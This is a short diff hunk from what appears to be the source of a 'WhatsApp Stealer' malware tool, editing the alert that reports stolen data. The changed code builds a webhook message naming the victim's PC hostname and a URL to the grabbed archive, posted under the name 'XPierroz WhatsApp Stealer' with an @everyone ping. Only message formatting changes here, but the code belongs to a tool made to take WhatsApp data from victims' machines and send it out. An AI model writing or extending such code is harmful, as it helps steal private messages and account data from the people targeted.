@@ -31,13 +31,13 @@ def l_om_est_eclate():
     os.remove(f"{temp}\\ssouput.zip")
     
     embed = {
-        "title": "🔔 Grab Alert",
-        "description": f"**XPierroz WhatsApp Stealer Report**\n\n🖥️ Pc Name: {socket.gethostname()}\n📎 Url: {m}",
+        "title": "**XPierroz WhatsApp Stealer Report**",
+        "description": f"🖥️ Pc Name: {socket.gethostname()}\n📎 Url: {m}",
         "color": 0x008000
     }
     
     payload = {
-        "content": "@everyone",
+        "content": "🔔 Grab Alert ||@everyone||",
         "username": "XPierroz WhatsApp Stealer",
         "avatar_url": "https://github.com/xpierroz/WhatsappStealer/blob/master/assets/whatsapp.png?raw=true",
         "embeds": [embed]
